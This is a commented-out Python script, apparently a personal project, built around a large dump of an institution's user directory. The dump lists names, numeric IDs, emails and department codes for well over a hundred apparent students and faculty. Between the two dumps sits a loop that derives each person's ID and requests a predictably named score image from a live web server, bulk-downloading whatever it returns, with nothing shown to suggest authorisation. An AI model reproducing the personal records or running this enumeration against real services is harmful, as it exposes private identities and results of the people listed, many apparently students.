# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "5a2dbc80-9c50-42da-bef2-bb56d09b6823",
# # #         "displayName": "NIDHEESH LAMBA.( 00010286269 )",
# # #         "email": "00010286269@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "d0d3e50c-7e38-4bee-9b06-80dbde3b9263",
# # #         "displayName": "Nidhi S(00014640597)",
# # #         "email": "00014640597@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "9831871e-2dae-4c9b-855a-64844195323f",
# # #         "displayName": "Nimmala Nishanth(00012725558)",
# # #         "email": "00012725558@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "7bd402fc-ac9f-431e-86c7-1fb6d75b51f2",
# # #         "displayName": "Nithyashree(00004995857)",
# # #         "email": "00004995857@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "881dd179-1c9f-47a5-81ea-c829345a2d5d",
# # #         "displayName": "Niyati Sajan(00012604823)",
# # #         "email": "00012604823@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "8b4c1dfb-3b64-499b-9879-eaf4f248004b",
# # #         "displayName": "Parag Giridhar Davangeri (FZ07122)",
# # #         "email": "paraggiridhardavangeri.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c3c6ec79-ae27-41b8-a5b0-9fecb80719ff",
# # #         "displayName": "Paramjot Singh (00014331524)",
# # #         "email": "00014331524@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "8c996e49-9ba3-4a57-a124-80505ac0ba55",
# # #         "displayName": "Paras phadke(00007944958)",
# # #         "email": "00007944958@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c5777e12-eec1-4caf-bc05-22a30f2aaf00",
# # #         "displayName": "Pasupula Narender (FC07807)",
# # #         "email": "pnarender.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "38c1bf80-b8c9-484d-8dcb-36f80a0c840a",
# # #         "displayName": "Pragya Sharma(00015303685)",
# # #         "email": "00015303685@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "b8d3ce5f-df0b-4420-bbb1-22ba6c245964",
# # #         "displayName": "Prajwal S R(00006789835)",
# # #         "email": "00006789835@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "aeb5c223-e5f2-4f35-816e-8fa5cd9e2d02",
# # #         "displayName": "Pranav R(00012241452)",
# # #         "email": "00012241452@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "a53683af-52d9-4364-8cd8-06ba350efd0d",
# # #         "displayName": "Pratik Nitin Mohorikar(00013593369)",
# # #         "email": "00013593369@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "9d28aa7c-1b79-49d4-81de-e97df6dceb39",
# # #         "displayName": "Prithvi bhat(00014409340)",
# # #         "email": "00014409340@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "b29fe3f6-8006-473b-bd9b-5f9540afc0e1",
# # #         "displayName": "priyansh soni(00014932307)",
# # #         "email": "00014932307@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "d5b88a75-adef-45db-ab59-787818944ecb",
# # #         "displayName": "Purvi Ambastha(00008450886)",
# # #         "email": "00008450886@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "8d45cab9-4bdc-4387-bcaa-7831fb2db06a",
# # #         "displayName": "RAHUL PRASATH A(00006386926)",
# # #         "email": "00006386926@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "28544e26-4c79-44a5-b309-5bcacb6ecb0e",
# # #         "displayName": "Rajarajeshwari R(00012403959)",
# # #         "email": "00012403959@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "6e2b7ee6-5582-4d71-a4d2-9edc15de02e3",
# # #         "displayName": "Rajeshkumar Karukuri (FB02109)",
# # #         "email": "rajeshkumarkarukuri.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "19164adc-70c1-44b1-a4a9-a2338ba14cb1",
# # #         "displayName": "Raksha V(00014592174)",
# # #         "email": "00014592174@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "ae184ec2-f51b-4003-b776-61f973929970",
# # #         "displayName": "Rakshan Sahu(00013125826)",
# # #         "email": "00013125826@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "bdda398c-b46b-4414-89a5-20b313fe3ef9",
# # #         "displayName": "Rakshith D N(00014165628)",
# # #         "email": "00014165628@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "f52981e7-38e8-4e62-9f37-ae3d2b4bb468",
# # #         "displayName": "Ram Babu Vemula (FM02381)",
# # #         "email": "rambabuvemula.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "2faaaa9b-b8c1-451c-899e-313acc9b83fe",
# # #         "displayName": "Rangesh(00013605834)",
# # #         "email": "00013605834@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "b38a8e40-2314-45f3-9894-f0b9e7616d6d",
# # #         "displayName": "Rishabh Gupta (FM10361)",
# # #         "email": "rishabhgupta.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "7a7c2655-2a48-4c19-958f-d5da31b9ee68",
# # #         "displayName": "Risith Rahul(00013226657)",
# # #         "email": "00013226657@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "e928ec4d-a6a8-42f1-9588-545768415b76",
# # #         "displayName": "Ritheeshwar R (00013949635)",
# # #         "email": "00013949635@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "88dc37ea-fb8b-47e0-8bd4-545b68db6c57",
# # #         "displayName": "Rohit bijoY(00014605954)",
# # #         "email": "00014605954@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "0614d524-fe05-4d6e-86f6-532853a21b1f",
# # #         "displayName": "Rohit S (00014586527)",
# # #         "email": "00014586527@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "490f168a-c393-47ba-964a-12c3191d38de",
# # #         "displayName": "S Dayanitha(00011222108)",
# # #         "email": "00011222108@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "408cd212-ccf4-4ce7-9347-10d3215972f9",
# # #         "displayName": "S R Aarabhi (00014612217)",
# # #         "email": "00014612217@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "55f62c47-ba17-42d0-b09f-cd7d405d346f",
# # #         "displayName": "SA Kavin(00015198132)",
# # #         "email": "00015198132@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "ac566173-fabb-4c61-a064-8f5b3609d5f2",
# # #         "displayName": "Saanvi Jha(00012595421)",
# # #         "email": "00012595421@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "155f205f-d507-45e6-93ec-2341e0628f52",
# # #         "displayName": "Sagar N(00005574512)",
# # #         "email": "00005574512@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "69ac6591-4790-4964-9454-643d5a602621",
# # #         "displayName": "Sagar R(00012616860)",
# # #         "email": "00012616860@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "e21f0c10-8fc4-46c0-b8ea-d924f3edc5c3",
# # #         "displayName": "Sai Haneesh(00014398876)",
# # #         "email": "00014398876@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "a7feebf5-ffcc-4e0f-b50a-0ab727ed67be",
# # #         "displayName": "Saidharshan S(00014592585)",
# # #         "email": "00014592585@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "ebe85286-73fc-4730-8997-7201b46d1554",
# # #         "displayName": "SaiVennela Sri V(00014036849)",
# # #         "email": "00014036849@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "30ba105e-ad47-4f77-9e42-89184cda0447",
# # #         "displayName": "Samanvitha Korada (00014591422)",
# # #         "email": "00014591422@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c8e1b6a6-d5ed-46e4-8333-4c60b1a439f7",
# # #         "displayName": "SAMARTH SAIBOYANI(00015245192)",
# # #         "email": "00015245192@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "41d24dba-eac3-425e-93c3-fc07a67dca5a",
# # #         "displayName": "Samridh Srivastava (00013785627)",
# # #         "email": "00013785627@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "a0ba6390-239d-461a-b5a3-d91859a3a659",
# # #         "displayName": "Samridhi Malik(00011646183)",
# # #         "email": "00011646183@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "08ec6bf0-9d76-482d-a36e-75221a04e2cc",
# # #         "displayName": "Saranya katakam( 00005481671 )",
# # #         "email": "00005481671@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "7ef9f3e6-fc89-440e-ae5b-3cf5f493b6aa",
# # #         "displayName": "Sarvesh V(00015130849)",
# # #         "email": "00015130849@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "5e9f5d08-2d58-4d8a-8eeb-080f80efe693",
# # #         "displayName": "Sathvika Varsaa (00008418241)",
# # #         "email": "00008418241@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "6b90b647-79e8-4827-b62a-02917dbe6970",
# # #         "displayName": "Shaik Mohammed Diyan(00007496353)",
# # #         "email": "00007496353@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "bd2d579c-e07c-4e0a-9fdb-a52458f136de",
# # #         "displayName": "Shameem P K (FP08056)",
# # #         "email": "shameempk.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "2b4882d2-4cfe-46a1-a45c-9ab7f0df2545",
# # #         "displayName": "Sharon Emil Sathish (00013939500)",
# # #         "email": "00013939500@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "8f2f86b7-16bd-4364-b989-5f75ff39b470",
# # #         "displayName": "Sharveswaran Mj (00014668423)",
# # #         "email": "00014668423@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "49508ff5-a0ea-4d30-a009-e903af0592c6",
# # #         "displayName": "Shivansh Pant(00009007081)",
# # #         "email": "00009007081@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "5b69f542-133d-4655-96a0-ed4dd1bf20bc",
# # #         "displayName": "Shlok prasad( 00010164459 )",
# # #         "email": "00010164459@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "cdaebf89-25da-4488-9291-975d81ec85ab",
# # #         "displayName": "SHREE MAWANDIA(00015262681)",
# # #         "email": "00015262681@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "1904e8fb-1d5f-4c4f-adab-225329118eb5",
# # #         "displayName": "Sidharth K Kaladharan(00014196218)",
# # #         "email": "00014196218@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "32708b48-082e-4a26-a290-4d9a437c8f1a",
# # #         "displayName": "Sneha Hiremath(00011769576)",
# # #         "email": "00011769576@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "d70175b3-06af-4d2c-b2e3-98023f11cf01",
# # #         "displayName": "sonu giri(00012758074)",
# # #         "email": "00012758074@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "7b997851-2905-43c7-bd27-70900335a909",
# # #         "displayName": "Sriram K(00011787986)",
# # #         "email": "00011787986@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "1a0b7ffa-c8aa-422f-bc15-257989371d80",
# # #         "displayName": "Srivignesh S(00014969208)",
# # #         "email": "00014969208@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "4ed70fe6-c1b5-4786-93a6-028cf142bd9e",
# # #         "displayName": "Stuti D S(00010069969)",
# # #         "email": "00010069969@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "01085cda-19cd-4c53-a487-54f298732813",
# # #         "displayName": "Sujeet Singh (FM11015)",
# # #         "email": "sujeetsingh.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "ef0e3865-1396-46be-9f75-74e4f0894a73",
# # #         "displayName": "Suvarna S(00014933269)",
# # #         "email": "00014933269@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "dd502bdd-fc8d-4633-bd2d-ea6880070a37",
# # #         "displayName": "SWADHYAY ROY(00008564460)",
# # #         "email": "00008564460@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "72d3e220-f0df-4db3-9bbc-3e4748ee960a",
# # #         "displayName": "Swathi Ramachandran(00012570784)",
# # #         "email": "00012570784@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "2d3c84b5-0dcb-4b5a-9f10-b65be2907527",
# # #         "displayName": "Syed Yusuf Rahman(00014633980)",
# # #         "email": "00014633980@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "81ad5dc2-b8d1-4e91-a20d-b631ee300e2f",
# # #         "displayName": "TANISHKA Tiwari(00014941149)",
# # #         "email": "00014941149@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "1228d3e7-8e69-464f-8760-c865bc3a35bd",
# # #         "displayName": "Tanmay Sukla (00013938763)",
# # #         "email": "00013938763@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "8cdb9784-8c4d-4549-ad7c-e4d165916e21",
# # #         "displayName": "Tanushri Yuvaraj (00014246813)",
# # #         "email": "00014246813@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "683cdabf-ffb8-408e-b0dd-d61a74081114",
# # #         "displayName": "Tarun Kumar G(00012247371)",
# # #         "email": "00012247371@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "bc69358d-cb41-4562-bcc2-2a7a130532c8",
# # #         "displayName": "Tatai Pal(00012274377)",
# # #         "email": "00012274377@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c3969cc9-ac29-4f22-a5c4-3a09856d8cd7",
# # #         "displayName": "Tejas Bhat(00015266463)",
# # #         "email": "00015266463@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "9e86df5f-056d-4fb4-ac5e-b1dafc8165b4",
# # #         "displayName": "Thanika Bajeesh(00008339378)",
# # #         "email": "00008339378@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "9ec074de-716a-4c2e-8254-22d4004a5fcd",
# # #         "displayName": "Thanushree Bs (00013941057)",
# # #         "email": "00013941057@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "0d232c99-04ca-4c82-97d7-a8318e419e0c",
# # #         "displayName": "Tharun Srivarshan R( 00010417064 )",
# # #         "email": "00010417064@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "ff9ba469-a5bd-441e-902f-45fc5659ac35",
# # #         "displayName": "Thavanish B(00012117200)",
# # #         "email": "00012117200@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "d3a512ed-0112-4c1c-94f7-07ed4d9e54a7",
# # #         "displayName": "toshan patra(00006333700)",
# # #         "email": "00006333700@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "b1c72796-0615-45ba-8c16-8d82f854ffcf",
# # #         "displayName": "Trisha T B (FM15173)",
# # #         "email": "trishatb.fac@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "61140b99-dda0-4c2f-8d15-716f8e9ad0f4",
# # #         "displayName": "TRISHANTH K(00014837878)",
# # #         "email": "00014837878@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "67d6cecb-0732-4e45-8fcb-98c367adf522",
# # #         "displayName": "Utkarsha Mandar Pandit(00013745747)",
# # #         "email": "00013745747@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "6b848cda-d421-4ceb-9bba-749e4eaefd2a",
# # #         "displayName": "Vallabhasetti Srihaas(00014110196)",
# # #         "email": "00014110196@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c2c12147-c48d-48f9-a8f0-363901ff7346",
# # #         "displayName": "Vedeshaa R(00014591418)",
# # #         "email": "00014591418@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "3bf21db3-ae35-4b6a-b7c6-6b012f0f1588",
# # #         "displayName": "Vedikka Ramesh(00013572546)",
# # #         "email": "00013572546@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "2ab2e1ff-0436-4524-926e-2d50e212ec13",
# # #         "displayName": "Vidita Amit Khatri(00012698041)",
# # #         "email": "00012698041@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "b39ca058-d06d-4919-a9f3-1898e5a39606",
# # #         "displayName": "Vihaan Vikram Gonal (00014357307)",
# # #         "email": "00014357307@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "9a9f9638-529c-40eb-b2f8-e68fec16127b",
# # #         "displayName": "Vilohit Kohli (00003698372)",
# # #         "email": "00003698372@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "575f325e-642f-46e5-9f99-94a92c42edb5",
# # #         "displayName": "Vineetha G N(00014909134)",
# # #         "email": "00014909134@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "c62a1324-28da-4e0a-a322-08c85ebe9dd6",
# # #         "displayName": "Vishnuvikash S (00014593471)",
# # #         "email": "00014593471@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "5f4d1baf-3f5e-4679-9cc4-04ff96f4f1f9",
# # #         "displayName": "Visvesh Khanna S (00013570533)",
# # #         "email": "00013570533@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "05288608-a28d-4418-a9c6-8ba95da6d1f4",
# # #         "displayName": "Vivan Kiran Shivam (00014331643)",
# # #         "email": "00014331643@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "0873f47d-b5c9-4e68-9770-545811e7ad3e",
# # #         "displayName": "Vyom Gupta(00006215129)",
# # #         "email": "00006215129@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "a9c59cf5-3762-47ac-9779-32566ef3a778",
# # #         "displayName": "Y JASHWANTH(00012964022)",
# # #         "email": "00012964022@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "468409bb-fcc9-4cd6-b54b-68a3848b6434",
# # #         "displayName": "YarramJayabharath Reddy(00014704921)",
# # #         "email": "00014704921@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "7e337a9b-be43-430c-9811-571f6963dad8",
# # #         "displayName": "Yuktha  S Maragal(00006692453)",
# # #         "email": "00006692453@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "39ed9d3c-5787-402b-a1e3-b1a4a7cc2b5d",
# # #         "displayName": "Yuktha N(00014602967)",
# # #         "email": "00014602967@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     },
# # #     {
# # #         "id": "49dc7b17-c9bf-472c-8a73-e4a878d7b3c7",
# # #         "displayName": "Yuvan S(00012886500)",
# # #         "email": "00012886500@aakashicampus.com",
# # #         "role": "Member",
# # #         "isExternalUser": false
# # #     }
# # # ]

# # # for person in ppl:
# # #     psid = person["email"].split("@")[0]
# # #     r = requests.get(f"http://aakashleap.com:3131/Content/ScoreToolImage/Output{psid}.jpg")
# # #     if r.status_code == 200:
# # #         with open(f"pictures/Output-{psid}.jpg", "wb") as f:
# # #             f.write(r.content)

# # # # import os
# # # # for i in os.listdir("pictures"):
# # # #     f = open(f"pictures/{i}", "rb")
# # # #     print(len(f.read()))
# # # #     if len(f.read()) == 0:
# # # #         print(i)
# # # #     f.close()


# import os 

# d = [
#     {
#       "id": "2e041c63-e6e7-4972-be5b-e01d4cc41b81",
#       "displayName": "aakarsh ashwin(00008910299)",
#       "userPrincipalName": "00008910299@aakashicampus.com",
#       "department": "BH410-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "a88b384d-40ba-483d-8c46-9c06b476ce71",
#       "displayName": "Aarush Bharadwaj(00014273691)",
#       "userPrincipalName": "00014273691@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "99a35253-56d4-4658-a8da-4b9a3356c4c6",
#       "displayName": "AARUSH PRAKASH(00013929897)",
#       "userPrincipalName": "00013929897@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "45958538-dea2-4554-b23c-4a6b388fa465",
#       "displayName": "Abheek Venkat D (00014703298)",
#       "userPrincipalName": "00014703298@aakashicampus.com",
#       "department": "CC-042",
#       "userType": "Member"
#     },
#     {
#       "id": "9f7487d9-bfbd-4efc-adba-5f45ef082005",
#       "displayName": "Abhinavrao T R(00014240679)",
#       "userPrincipalName": "00014240679@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "bdf1558c-124c-4407-8ad6-f63573a8ccf9",
#       "displayName": "Adhish A N(00014123861)",
#       "userPrincipalName": "00014123861@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "7730019c-5ef5-4453-89f0-7db8510806e7",
#       "displayName": "Adhvik PJ(00009248868)",
#       "userPrincipalName": "00009248868@aakashicampus.com",
#       "department": "BI040-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "930f09d1-e851-404c-a39a-9e341e70b9a5",
#       "displayName": "Aditi Policepatil(00012622831)",
#       "userPrincipalName": "00012622831@aakashicampus.com",
#       "department": "BI040-2425",
#       "userType": "Member"
#     },
#     {
#       "id": "e47dfb67-c383-4dad-9782-175dc391d327",
#       "displayName": "Aditya K(00015291751)",
#       "userPrincipalName": "00015291751@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "d15d0a99-9569-4c6b-97e8-10f4bec72bdc",
#       "displayName": "Aditya Tippannavar(00014601360)",
#       "userPrincipalName": "00014601360@aakashicampus.com",
#       "department": "BH410-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "2ce65b57-db8f-4799-91e2-c4cad2612a51",
#       "displayName": "Adweta Sahu(00014570652)",
#       "userPrincipalName": "00014570652@aakashicampus.com",
#       "department": "BH410-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "d1c59bc7-bf8d-4e77-9461-54d100191c32",
#       "displayName": "Akhil Ramprasad(00014585973)",
#       "userPrincipalName": "00014585973@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "acd1b0e7-9bd1-479e-9357-e028e2c44c9e",
#       "displayName": "Akruthid Mahadikar(00013963961)",
#       "userPrincipalName": "00013963961@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "7166f85a-4325-4cde-80f9-dfcc0d6062d7",
#       "displayName": "Ananya Gangadhar(00012310266)",
#       "userPrincipalName": "00012310266@aakashicampus.com",
#       "department": "WF064-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "fd8458db-cc4a-4fe3-a641-1675e2ec9e22",
#       "displayName": "Ananya Hemantkumar(00010709139)",
#       "userPrincipalName": "00010709139@aakashicampus.com",
#       "department": "BI040-2324",
#       "userType": "Member"
#     },
#     {
#       "id": "411771f4-f381-4663-99a2-43e77f669a9a",
#       "displayName": "Ananya Moulik(00014104961)",
#       "userPrincipalName": "00014104961@aakashicampus.com",
#       "department": "JH675-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "acee8d82-da13-454f-a37b-532d795c2d21",
#       "displayName": "Anay Krishna (00014654825)",
#       "userPrincipalName": "00014654825@aakashicampus.com",
#       "department": "CC-064",
#       "userType": "Member"
#     },
#     {
#       "id": "6b299735-928d-4a05-b5ac-e44faeb4afe9",
#       "displayName": "Anirudh Annoo(00012561688)",
#       "userPrincipalName": "00012561688@aakashicampus.com",
#       "department": "KA654-2426",
#       "userType": "Member"
#     },
#     {
#       "id": "150f1465-b30a-4611-a8f4-89836c729edc",
#       "displayName": "ANIRUDH MISHRA .(00006218659)",
#       "userPrincipalName": "00006218659@aakashicampus.com",
#       "department": "BH083",
#       "userType": "Member"
#     },
#     {
#       "id": "3f66fdeb-995d-4024-b376-9f9a8c90cf9f",
#       "displayName": "Anurag Babar(00014575657)",
#       "userPrincipalName": "00014575657@aakashicampus.com",
#       "department": "BI040-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "67ab0c88-b88d-4443-91ab-e3475287b59d",
#       "displayName": "Anushka Gaonkar(00011589489)",
#       "userPrincipalName": "00011589489@aakashicampus.com",
#       "department": "BH410-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "fe48690c-d490-4278-8ef9-6fe743956bc1",
#       "displayName": "ANUSHKA TIWARY(00014542793)",
#       "userPrincipalName": "00014542793@aakashicampus.com",
#       "department": "BH410-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "c56fb97b-b9a5-4ffa-b83e-bc61d3e8710e",
#       "displayName": "Arsh Mohmed V M(00014718390)",
#       "userPrincipalName": "00014718390@aakashicampus.com",
#       "department": "BJ042-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "6602e037-4c7e-4c65-940a-0c356d197f71",
#       "displayName": "ASHWANTH KUMAR S( 00010082311 )",
#       "userPrincipalName": "00010082311@aakashicampus.com",
#       "department": "AESL1",
#       "userType": "Member"
#     },
#     {
#       "id": "55b5c895-4ab7-46e1-9c9c-f778cd9a5dc7",
#       "displayName": "Ashwin Karnam(00013842733)",
#       "userPrincipalName": "00013842733@aakashicampus.com",
#       "department": "WF064-2527",
#       "userType": "Member"
#     },
#     {
#       "id": "7e7e4ee8-6783-44d8-844e-dc869684cb57",
#       "displayName": "Avaneesh Prasanna(00013948052)",
#       "userPrincipalName": "00013948052@aakashicampus.com",
#       "department": "BH410-2527",
#       "userType": "Member"
#     },
#     {
